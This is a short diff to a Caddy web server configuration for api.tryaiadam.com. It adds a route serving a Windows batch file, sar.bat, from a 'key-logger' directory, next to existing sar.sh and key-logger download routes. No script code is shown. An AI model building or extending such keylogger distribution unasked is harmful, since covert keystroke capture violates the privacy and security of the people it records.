@@ -88,6 +88,14 @@ api.tryaiadam.com {
         header Content-Disposition "attachment; filename=sar.sh"
     }
     
+    # Serve the sar.bat script for Windows
+    handle /sar.bat {
+        root * /usr/share/caddy/key-logger
+        file_server
+        header Content-Type "application/octet-stream"
+        header Content-Disposition "attachment; filename=sar.bat"
+    }
+    
     # Serve key-logger files for download
     handle /key-logger/* {
         root * /usr/share/caddy
